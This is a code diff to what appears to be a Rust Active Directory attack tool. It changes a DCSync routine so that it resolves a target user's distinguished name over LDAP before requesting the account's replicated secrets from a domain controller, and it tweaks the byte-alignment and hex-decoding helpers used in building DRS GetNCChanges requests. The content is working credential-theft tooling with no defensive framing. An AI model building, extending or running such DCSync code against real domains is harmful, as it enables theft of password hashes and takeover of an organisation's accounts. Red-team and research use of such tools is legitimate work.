@@ -11,6 +11,7 @@ use md4::{Digest as Md4Digest, Md4};
 use md5::Md5;
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::proto::drsr;
+use overthrone_core::proto::ldap::LdapSession;
 use overthrone_core::proto::smb::SmbSession;
 use std::sync::atomic::{AtomicU32, Ordering};
 use tracing::{debug, info, warn};
@@ -87,7 +88,40 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
         .map(|p| format!("DC={p}"))
         .collect::<Vec<_>>()
         .join(",");
-    let user_dn = format!("CN={},CN=Users,{}", target_user, base_dn);
+
+    // Look up the actual user DN via LDAP search instead of assuming CN=Users.
+    // Users may reside in any OU; hardcoding CN=Users misses everyone else.
+    let user_dn = {
+        let ldap_user = &config.username;
+        let ldap_pass = config.password.as_deref().unwrap_or("");
+        let filter = format!("(&(objectClass=user)(sAMAccountName={}))", target_user);
+        match LdapSession::connect(&config.dc_ip, &config.domain, ldap_user, ldap_pass, false).await {
+            Ok(mut ldap) => {
+                match ldap.custom_search(&filter, &["distinguishedName"]).await {
+                    Ok(entries) if !entries.is_empty() => {
+                        let dn = entries[0]
+                            .attrs
+                            .get("distinguishedName")
+                            .and_then(|v| v.first())
+                            .cloned()
+                            .unwrap_or_else(|| format!("CN={},CN=Users,{}", target_user, base_dn));
+                        info!("[dcsync] Resolved DN for '{}': {}", target_user, dn);
+                        let _ = ldap.disconnect().await;
+                        dn
+                    }
+                    _ => {
+                        warn!("[dcsync] LDAP search failed; falling back to CN=Users,{}", base_dn);
+                        let _ = ldap.disconnect().await;
+                        format!("CN={},CN=Users,{}", target_user, base_dn)
+                    }
+                }
+            }
+            Err(e) => {
+                warn!("[dcsync] Could not connect to LDAP for DN lookup: {e}; using CN=Users fallback");
+                format!("CN={},CN=Users,{}", target_user, base_dn)
+            }
+        }
+    };
 
     // ── Credentials ──
     let (user, pass, nt_hash_bytes) = resolve_credentials(config)?;
@@ -469,7 +503,7 @@ fn build_drs_get_nc_changes(handle: &[u8], object_dn: &str, _nc_dn: &str) -> Vec
     stub.extend_from_slice(&nc_utf16); // StringName (UTF-16LE)
 
     // Align to 4 bytes
-    while !stub.len().is_multiple_of(4) {
+    while stub.len() % 4 != 0 {
         stub.push(0);
     }
 
@@ -606,7 +640,7 @@ fn hex_encode_bytes(data: &[u8]) -> String {
 
 fn hex_decode(hex: &str) -> Option<Vec<u8>> {
     let hex = hex.trim();
-    if !hex.len().is_multiple_of(2) {
+    if hex.len() % 2 != 0 {
         return None;
     }
     (0..hex.len())
